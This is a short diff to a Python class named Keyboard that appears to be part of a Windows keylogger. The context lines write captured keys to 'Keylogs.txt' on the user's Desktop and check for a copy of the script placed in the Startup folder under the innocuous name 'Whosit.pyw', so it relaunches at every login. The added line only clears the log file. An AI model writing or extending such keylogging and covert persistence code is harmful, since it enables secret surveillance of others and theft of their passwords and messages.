@@ -19,6 +19,7 @@ class Keyboard:
         self.t=localtime()
         self.current_user=os.getlogin()
         self.log_file=f'C:\\Users\\{self.current_user}\\Desktop\\Keylogs.txt'
+        open(self.log_file,'w').close()
         #checks if the file already exists in the destination directory !
         self.file_path=f'C:\\Users\\{self.current_user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Whosit.pyw'
         if not os.path.isfile(self.file_path):
